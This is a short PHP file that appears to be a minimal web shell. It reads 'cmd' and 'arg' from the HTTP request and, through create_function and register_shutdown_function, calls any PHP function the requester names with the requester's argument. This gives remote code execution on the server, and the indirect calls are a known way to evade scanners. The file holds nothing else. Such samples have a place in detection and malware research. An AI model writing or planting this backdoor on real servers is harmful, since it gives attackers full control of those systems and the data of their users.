<?php

    $a=$_REQUEST['cmd'];
$b=$_REQUEST['arg'];
   register_shutdown_function(create_function('', "$a($b);"));
